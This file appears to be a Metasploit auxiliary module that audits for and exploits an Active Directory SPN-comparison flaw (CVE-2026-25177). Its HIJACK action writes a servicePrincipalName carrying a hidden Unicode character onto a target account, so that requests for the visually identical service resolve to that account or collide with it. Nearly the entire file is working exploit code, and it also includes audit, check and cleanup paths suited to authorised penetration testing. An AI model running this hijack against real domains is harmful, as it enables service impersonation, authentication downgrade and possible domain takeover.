##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP

  HIDDEN_CHARACTERS = {
    'U+00AD' => "\u{00ad}",
    'U+034F' => "\u{034f}",
    'U+061C' => "\u{061c}",
    'U+200B' => "\u{200b}",
    'U+200C' => "\u{200c}",
    'U+200D' => "\u{200d}",
    'U+2060' => "\u{2060}",
    'U+FEFF' => "\u{feff}"
  }.freeze

  COMPARISON_IGNORABLE_CHARACTERS = %w[U+00AD U+034F U+061C U+200C U+200D U+2060 U+FEFF].map do |name|
    HIDDEN_CHARACTERS.fetch(name)
  end.join.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'KerberLoss Active Directory SPN Confusion',
        'Description' => %q{
          This module audits for and exercises the KerberLoss service principal name (SPN)
          comparison inconsistency in Active Directory. A user with permission to write the
          servicePrincipalName attribute of another account can add an SPN containing a
          comparison-ignorable Unicode character. On affected domain controllers, a request
          for the visually identical SPN can resolve to the modified account or become
          ambiguous, enabling service impersonation or authentication downgrade conditions.

          The AUDIT action is read-only. CHECK uses a random, non-service probe SPN and removes
          it in an ensure block. HIJACK adds the selected value and leaves it in place only when
          LDAP resolution is effective. CLEANUP removes that exact value. LDAP resolution alone
          does not prove that a Kerberos service ticket can be decrypted by the target account.
        },
        'Author' => [
          'Shai Laron', # Vulnerability discovery
          'Elliot Belt', # Public technical research
          'adilalperenciftci' # Metasploit module implementation
        ],
        'References' => [
          ['CVE', '2026-25177'],
          ['URL', 'https://www.semperis.com/blog/identity-crisis-novel-vulnerabilities-leading-to-kerberos-downgrade-dos-and-full-domain-takeover/'],
          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-25177'],
          ['URL', 'https://felixbillieres.github.io/posts/kerberloss-cve-2026-25177/']
        ],
        'DisclosureDate' => '2026-03-10',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['AUDIT', { 'Description' => 'Read the target SPNs and current owners of the requested SPN' }],
          ['CHECK', { 'Description' => 'Use and remove a random probe SPN to test comparison behavior' }],
          ['HIJACK', { 'Description' => 'Add a hidden-character SPN to the target account' }],
          ['CLEANUP', { 'Description' => 'Remove the exact hidden-character SPN from the target account' }]
        ],
        'DefaultAction' => 'AUDIT',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptString.new('BASE_DN', [false, 'LDAP base DN; discovered automatically when omitted']),
        OptString.new('TARGET_DN', [false, 'Distinguished name of the account that receives the SPN']),
        OptString.new('TARGET_ACCOUNT', [false, 'sAMAccountName of the account that receives the SPN']),
        OptString.new('SPN', [false, 'Clean service principal name, for example cifs/DC1.example.test']),
        OptEnum.new('UNICODE_CODEPOINT', [true, 'Hidden codepoint appended to the SPN', 'U+200C', HIDDEN_CHARACTERS.keys])
      ]
    )
  end

  def validate
    super

    errors = {}
    if datastore['TARGET_DN'].blank? && datastore['TARGET_ACCOUNT'].blank?
      errors['TARGET_DN'] = 'Set TARGET_DN or TARGET_ACCOUNT.'
    end
    if action.name != 'CHECK'
      if datastore['SPN'].blank?
        errors['SPN'] = "The #{action.name} action requires SPN."
      elsif !clean_spn?(datastore['SPN'])
        errors['SPN'] = 'SPN already contains a comparison-ignorable character; set the clean SPN instead.'
      end
    end

    raise Msf::OptionValidateError, errors unless errors.empty?
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)
      @ldap = ldap
      @base_dn = datastore['BASE_DN'].presence || ldap.base_dn
      fail_with(Failure::NotFound, "Couldn't discover the base DN") if @base_dn.blank?

      @target_dn = target_dn
      send("action_#{action.name.downcase}")
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def action_audit
    spns = target_spns(@target_dn)
    print_status("Target: #{@target_dn}")
    if spns.empty?
      print_status('The target has no explicit servicePrincipalName values.')
    else
      spns.each { |spn| print_status("Target SPN: #{visible_value(spn)}") }
    end

    owners = spn_owners(datastore['SPN'])
    print_status("Exact-query owners of #{visible_value(datastore['SPN'])}: #{owners.empty? ? 'none' : owners.join(', ')}")
  end

  def action_check
    probe_spn = "msf/#{Rex::Text.rand_text_alphanumeric(16).downcase}.invalid"
    probe_value = poisoned_spn(probe_spn, datastore['UNICODE_CODEPOINT'])
    print_status("Testing comparison behavior with temporary value #{visible_value(probe_value)}")

    owners = with_temporary_spn(@target_dn, probe_value) { spn_owners(probe_spn) }
    if owners.any? { |owner| owner.casecmp?(@target_dn) }
      print_good('The clean probe resolved to the account containing the hidden-character SPN; the DC appears affected.')
    else
      print_status('The clean probe did not resolve to the target account.')
    end
  end

  def action_hijack
    clean_spn = datastore['SPN']
    hidden_spn = poisoned_spn(clean_spn, datastore['UNICODE_CODEPOINT'])
    if target_spns(@target_dn).include?(hidden_spn)
      fail_with(Failure::BadConfig, "The target already contains #{visible_value(hidden_spn)}; refusing to modify or roll back a pre-existing value.")
    end
    before = spn_owners(clean_spn)

    print_status("Adding #{visible_value(hidden_spn)} to #{@target_dn}")
    add_spn(@target_dn, hidden_spn)

    # Anything that leaves this block without an effective result, including a failed
    # verification query, has to take the newly written value back out again.
    keep_spn = false
    begin
      classification = classify_resolution(before, spn_owners(clean_spn), @target_dn)
      keep_spn = %i[hijack collision].include?(classification)

      case classification
      when :hijack
        print_good("The clean SPN now resolves to the target account in LDAP: #{@target_dn}")
      when :collision
        print_good('The clean SPN now has multiple LDAP owners, creating a collision and downgrade condition.')
      else
        print_warning('The hidden-character SPN did not alter clean-SPN resolution; rolling it back.')
      end

      print_warning('Request and decrypt a service ticket before treating LDAP resolution as cryptographic proof.') if keep_spn
    ensure
      rollback_spn(@target_dn, hidden_spn) unless keep_spn
    end
  end

  def action_cleanup
    hidden_spn = poisoned_spn(datastore['SPN'], datastore['UNICODE_CODEPOINT'])
    unless target_spns(@target_dn).include?(hidden_spn)
      print_status("#{@target_dn} does not contain #{visible_value(hidden_spn)}; nothing to remove.")
      return
    end

    print_warning("CLEANUP removes #{visible_value(hidden_spn)} even if this module did not add it; confirm that the value is not a legitimate SPN before continuing.")
    print_status("Removing #{visible_value(hidden_spn)} from #{@target_dn}")
    delete_spn(@target_dn, hidden_spn)
    print_good('The exact hidden-character SPN was removed.')
  end

  private

  def hidden_character(codepoint_name)
    HIDDEN_CHARACTERS.fetch(codepoint_name) do
      raise ArgumentError, "Unsupported hidden codepoint: #{codepoint_name}"
    end
  end

  def poisoned_spn(spn, codepoint_name)
    "#{spn}#{hidden_character(codepoint_name)}"
  end

  def visible_value(value)
    value.each_codepoint.map do |codepoint|
      if codepoint.between?(0x20, 0x7e)
        codepoint.chr
      else
        format('<U+%04X>', codepoint)
      end
    end.join
  end

  def normalize_kerberloss_value(value)
    value.delete(COMPARISON_IGNORABLE_CHARACTERS).downcase
  end

  # A clean SPN is one the DC compares verbatim. If the operator supplied a value that
  # already carries an ignorable codepoint, every "clean" query in this module would
  # silently be a query for a poisoned value instead.
  def clean_spn?(value)
    normalize_kerberloss_value(value) == value.downcase
  end

  def classify_resolution(owners_before, owners_after, target_object_dn)
    normalized_target_dn = target_object_dn.downcase
    normalized_before = owners_before.map(&:downcase).uniq
    normalized_after = owners_after.map(&:downcase).uniq
    return :ineffective if normalized_before.include?(normalized_target_dn)
    return :ineffective unless normalized_after.include?(normalized_target_dn)
    return :collision if normalized_after.length > 1

    :hijack
  end

  def rollback_spn(object_dn, spn)
    delete_spn(object_dn, spn)
    print_status("Rolled back #{visible_value(spn)}.")
    true
  rescue ::StandardError => e
    print_error("Couldn't roll back #{visible_value(spn)} on #{object_dn} (#{e.class}: #{e.message}); remove it manually.")
    false
  end

  def with_temporary_spn(object_dn, spn)
    added = false
    add_spn(object_dn, spn)
    added = true
    yield
  ensure
    delete_spn(object_dn, spn) if added
  end

  def constraint_failure_message(details)
    "The server rejected the SPN with a constraint violation (#{details}). This can indicate a patched DC or an insufficient write primitive; Validated-SPN write is not equivalent to unrestricted servicePrincipalName WriteProperty."
  end

  def target_dn
    return datastore['TARGET_DN'] if datastore['TARGET_DN'].present?

    filter = Net::LDAP::Filter.eq('sAMAccountName', ldap_escape_filter(datastore['TARGET_ACCOUNT']))
    entries = @ldap.search(base: @base_dn, filter: filter, attributes: ['distinguishedName'])
    validate_query_result!(@ldap.get_operation_result.table, filter)
    fail_with(Failure::NotFound, "Could not find TARGET_ACCOUNT #{datastore['TARGET_ACCOUNT']}") if entries.empty?
    fail_with(Failure::UnexpectedReply, "TARGET_ACCOUNT #{datastore['TARGET_ACCOUNT']} matched multiple objects") if entries.length > 1

    entries.first[:distinguishedname].first.to_s
  end

  def target_spns(object_dn)
    entry = @ldap.search(base: object_dn, scope: Net::LDAP::SearchScope_BaseObject, attributes: ['servicePrincipalName'])&.first
    validate_query_result!(@ldap.get_operation_result.table)
    fail_with(Failure::NotFound, "Could not read #{object_dn}") if entry.nil?

    entry[:serviceprincipalname].map(&:to_s)
  end

  def spn_owners(spn)
    filter = Net::LDAP::Filter.eq('servicePrincipalName', ldap_escape_filter(spn))
    entries = @ldap.search(base: @base_dn, filter: filter, attributes: ['distinguishedName'])
    validate_query_result!(@ldap.get_operation_result.table, filter)
    entries.map { |entry| entry[:distinguishedname].first.to_s }
  end

  def add_spn(object_dn, spn)
    modify_spn(object_dn, :add, spn)
  end

  def delete_spn(object_dn, spn)
    modify_spn(object_dn, :delete, spn)
  end

  def modify_spn(object_dn, operation, spn)
    return true if @ldap.modify(dn: object_dn, operations: [[operation, :serviceprincipalname, spn]])

    result = @ldap.get_operation_result
    if result.code == Net::LDAP::ResultCodeConstraintViolation
      fail_with(Failure::NoAccess, constraint_failure_message(result.error_message.presence || result.message))
    end

    fail_with(Failure::NoAccess, "LDAP #{operation} failed for #{visible_value(spn)}: #{result.message} - #{result.error_message}")
  end
end
